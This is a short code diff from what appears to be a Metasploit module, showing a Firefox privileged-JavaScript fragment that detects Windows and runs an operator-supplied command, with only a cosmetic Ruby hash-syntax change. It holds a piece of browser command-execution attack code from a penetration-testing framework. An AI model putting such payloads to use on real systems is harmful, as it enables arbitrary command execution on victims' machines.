@@ -44,7 +44,7 @@ module Metasploit3
         .getService(Components.interfaces.nsIHttpProtocolHandler).userAgent;
         var windows = (ua.indexOf("Windows")>-1);
 
-        var cmd = (#{JSON.unparse({ :cmd => datastore['CMD'] })}).cmd;
+        var cmd = (#{JSON.unparse({ cmd: datastore['CMD'] })}).cmd;
         if (#{datastore['WSCRIPT']} && windows) {
           runCmd(cmd);
         } else {
